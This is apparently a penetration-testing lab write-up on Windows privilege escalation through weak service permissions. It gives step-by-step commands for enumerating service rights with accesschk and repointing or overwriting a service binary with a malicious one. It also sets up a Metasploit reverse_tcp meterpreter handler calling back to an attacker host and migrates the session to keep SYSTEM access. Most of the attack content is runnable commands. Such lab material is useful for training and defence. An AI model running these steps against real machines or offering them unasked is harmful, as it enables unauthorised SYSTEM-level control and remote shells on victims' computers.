# Weak Service Permissions

## Weak Service Permissions

This quick lab covers two Windows service misconfigurations that allow an attacker to elevate their privileges:

1. A low privileged user is allowed to change service configuration - for example change the service binary the service launches when it starts
2. A low privileged user can overwrite the binary the service launches when it starts

### 1. Changing Service Configuration

Let's enumerate services with `accesschk` from SysInternals and look for `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG` as these privileges allow attackers to modify service configuration:

{% code title="attacker\@victim" %}
```
\\vboxsvr\tools\accesschk.exe /accepteula -ucv "mantvydas" evilsvc
or
\\vboxsvr\tools\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```
{% endcode %}

Below indicates that the user `mantvydas` has full access to the service:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LfQqByIDF5gMSoDNhk_%2F-LfQxQsNMbh9wtREtazf%2FAnnotation%202019-05-21%20205403.png?alt=media\&token=907c84bd-c047-4cd3-9920-7d8afc227e16)

Let's modify the service and point its binary to our malicious binary that will get us a meterpreter shell when the service is launched:

{% code title="attacker\@victim" %}
```
.\sc.exe config evilsvc binpath= "c:\program.exe"
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LfQqByIDF5gMSoDNhk_%2F-LfQxuVr05oPcMg42QwD%2FAnnotation%202019-05-21%20205633.png?alt=media\&token=2c1c859d-17f4-4606-acf1-ceda512b69f0)

Let's fire up a multihandler in mfsconsole:

{% code title="attacker\@kali" %}
```
msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
```
{% endcode %}

...and start the vulnerable service:

{% code title="attacker\@victim" %}
```
.\sc.exe start evilsvc
```
{% endcode %}

..and enjoy the meterpreter session:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LfQqByIDF5gMSoDNhk_%2F-LfQz8uKhh0sgwvqHXHd%2FAnnotation%202019-05-21%20210027.png?alt=media\&token=75a559d4-e903-4653-bdf4-0014344a5c4d)

Note that the meterpreter session will die soon since the meterpreter binary `program.exe` that the vulnerable service `VulnSvc` kicked off, is not a compatible service binary. To save the session, migrate it to another sprocess:

{% code title="attacker\@kali" %}
```
run post/windows/manage/migrate
```
{% endcode %}

Even though the service failed, the session was migrated and saved:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LfQqByIDF5gMSoDNhk_%2F-LfR--yC-M0aaMjzfPO0%2FAnnotation%202019-05-21%20210541.png?alt=media\&token=1a62ef1c-6b93-480f-a104-58a4386e4db6)

### 2. Overwriting Service Binary

From the first exercise, we know that our user has `SERVICE_ALL_ACCESS` for the service `evilsvc`. Let's check the service binary path:

{% code title="attacker\@victim" %}
```
sc.exe qc evilsvc
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LfR08zXEl1YZ80NCO0w%2F-LfR0BB2kCT-lS1fF_7h%2FAnnotation%202019-05-21%20210916.png?alt=media\&token=8c96bbd8-fc5b-4eb3-a315-c07052d3e8dd)

Let's check file permissions of the binary c:\service.exe using a native windows tool `icals` and look for (M)odify or (F)ull permissions for `Authenticated Users` or the user you currently have a shell with:

{% code title="attacker\@victim" %}
```
icacls C:\service.exe
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LfR08zXEl1YZ80NCO0w%2F-LfR0MqaYrrcerQUvsHV%2FAnnotation%202019-05-21%20211128.png?alt=media\&token=c9e84d23-8636-4d9d-96f0-8799114e593c)

Since c:\service.exe is (M)odifiable by any authenticated user, we can move our malicious binary c:\program.exe to c:\service.exe:

{% code title="attacker\@victim" %}
```
cp C:\program.exe C:\service.exe
ls c:\
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LfR08zXEl1YZ80NCO0w%2F-LfR0_cS8E9RVeGIrZQq%2FAnnotation%202019-05-21%20211232.png?alt=media\&token=0d7e0f4d-2f8d-48fb-b8f0-304030661175)

...and get the meterpreter shell once `sc start evilsvc` is executed. Note that the shell will die if we do not migrate the process same way as mentioned earlier:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LfR08zXEl1YZ80NCO0w%2F-LfR0rMgwsfchYJdGaCV%2FAnnotation%202019-05-21%20211349.png?alt=media\&token=c8187874-4d5b-4710-9460-5d6d83d4315f)

Since services usually run under `NT AUTHORITY\SYSTEM`, our malicious binary gets executed with `SYSTEM` privileges:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LfR2l2q29QGX-ehsNl7%2F-LfR3MA-AJ7pVG_uHmo5%2FAnnotation%202019-05-21%20212438.png?alt=media\&token=042b834d-db4c-4748-8235-f111f0de985c)
